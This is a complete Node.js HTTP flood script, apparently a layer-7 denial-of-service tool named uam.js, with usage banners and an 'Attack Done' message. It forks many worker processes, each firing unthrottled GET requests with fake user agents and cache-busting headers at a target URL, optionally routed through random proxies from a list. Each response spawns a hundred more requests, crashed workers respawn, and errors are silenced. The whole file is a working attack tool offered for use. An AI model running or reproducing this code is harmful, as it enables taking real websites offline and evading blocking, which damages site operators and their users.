require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request')
const fakeUa = require('fake-useragent')
const fs = require('fs')
const cluster = require('cluster')
async function mainprocess(){
    if (process.argv.length != 6){
        console.log("USAGE : node uam.js url thread time raw/proxy.txt")
        console.log(`

        ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄     

        ▐  ▄▀   ▐ ▐  ▄▀   ▐ █ █   ▐     

          █▄▄▄▄▄    █▄▄▄▄▄     ▀▄       

          █    ▌    █    ▌  ▀▄   █      

         ▄▀▄▄▄▄    ▄▀▄▄▄▄    █▀▀▀       

         █    ▐    █    ▐    ▐          

         ▐         ▐                    

    `)
    console.log("EXEMP: node uam.js https://ditmemay.com/ <thread> <time> raw/proxy.txt")
        process.exit()
    }
    else{
        if (process.argv[5]=='raw'){
            console.log('\x1b[38;5;228mLucifer\x1b[38;5;255m@\x1b[38;5;207mRaw')
        }
        else{  
            console.log("\x1b[38;5;228mLucifer\x1b[38;5;255m@\x1b[38;5;207mProxy")
        }
        function run(){
            if (process.argv[5] == 'raw'){
                var http={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'
                    }
                }
                request(http,function(e,r){
                    console.log(r.statusCode,r.statusMessage)
                    if (r.statusCode > 226){
                	for (let q=0;q<100;q++){
                    request(http)}
                }
                })
                
            }
            else if(process.argv[5] == process.argv[5]){                
                var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'); 
                if (proxies.length == 0){
                process.exit(0)}
                var proxy = proxies[Math.floor(Math.random()* proxies.length)]
                proxyrequests = request.defaults({'proxy':'http://'+proxy})
                var config={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'
                    }
                }
                proxyrequests(config,function(e,r){
                    console.log(r.statusCode,r.statusMessage)
                    if (r.statusCode >= 200 && r.statusCode <= 226 ){
                  for (let m=0;m<100;m++){
                    proxyrequests(config)
                  }          
                }             
                })
                                
            }                       
        }
    }
    function thread(){
        setInterval(()=>{
            run()
        })
    }
    async function main(){
    if (cluster.isMaster){
        for (let i=0;i<process.argv[3];i++){
            cluster.fork()
            console.log("Create By PhDinhQuoc !! ")                                   
        }
    cluster.on("exit",function(){
        cluster.fork()
    })
    }
    else{
        thread()
    }
    }
main()    
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});

setTimeout(()=>{
    console.log("\x1b[38;5;228mLucifer\x1b[38;5;255m@\x1b[38;5;207mAttack Done !!!")
    process.exit()
},process.argv[4] * 1000)
mainprocess()

